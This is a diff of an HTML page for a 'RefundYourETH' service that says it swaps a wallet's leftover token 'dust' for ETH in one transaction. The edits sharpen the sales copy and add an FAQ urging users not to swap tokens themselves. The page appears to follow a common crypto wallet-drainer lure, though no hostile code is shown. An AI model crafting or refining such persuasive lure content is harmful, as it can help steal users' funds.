@@ -325,10 +325,9 @@
 <body>
 
   <div class="header">
-    <!-- Logo updated and spinning animation removed -->
     <img src="https://iili.io/FD9tvja.png" alt="RefundYourETH Logo" class="logo" onerror="this.style.display='none'">
-    <h1>Consolidate Your Wallet's Dust</h1>
-    <p class="tagline">Our service scans for small, leftover "dust" balances of ERC-20 tokens in your wallet and allows you to swap them for Ethereum (ETH) in a single, secure transaction.</p>
+    <h1>Swap All Your Dust for ETH in One Go</h1>
+    <p class="tagline">Tired of paying gas for every small swap? Our service finds your wallet's token "dust" and lets you convert it all to ETH in <strong>one single transaction</strong>, saving you time and gas fees.</p>
   </div>
 
   <div class="card">
@@ -342,7 +341,7 @@
     <div id="claimable-amount"></div>
 
     <div id="action-buttons" style="margin-top:16px; display:none;">
-      <button id="convert-now" class="button">Convert to ETH</button>
+      <button id="convert-now" class="button">Convert to ETH (1 Gas Fee)</button>
       <button id="burn-now" class="button secondary">Burn Dust</button>
     </div>
   </div>
@@ -374,14 +373,17 @@
         </tr>
       </thead>
       <tbody>
-        <!-- Populated by JS -->
-      </tbody>
+        </tbody>
     </table>
     <p class="donation-note">To keep this tool running, a 15% service fee is automatically deducted from the recovered amount to cover server, development, and gas costs.</p>
   </div>
 
   <div class="content-section">
     <h2>Frequently Asked Questions</h2>
+    <div class="faq-item">
+      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">Why not just swap them myself?</div>
+      <div class="faq-answer">Swapping each token individually on a DEX (like Uniswap) would require a separate transaction and a separate gas fee for each swap. Our service bundles all your dust into a single transaction, meaning you only pay the Ethereum network gas fee <strong>once</strong> to convert everything.</div>
+    </div>
     <div class="faq-item">
       <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">How does this service work?</div>
       <div class="faq-answer">We scan your wallet for a list of common ERC-20 tokens. If we find any balances, we use a secure smart contract to bundle them up and swap them for ETH on a decentralized exchange, sending the ETH back to you.</div>
@@ -415,12 +417,10 @@
 
   <div id="toast" class="toast"></div>
 
-  <!-- Libraries -->
   <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
   <script src="https://unpkg.com/@web3modal/ethereum@2.7.1/dist/index.js"></script>
   <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.7.1/dist/index.umd.js"></script>
 
-  <!-- App JS -->
   <script>
     /************ CONFIG – REPLACE THESE VALUES ************/
     const WALLETCONNECT_PROJECT_ID = 'YOUR_WALLET_CONNECT_PROJECT_ID'; // <-- IMPORTANT: GET YOUR OWN ID FROM https://cloud.walletconnect.com/
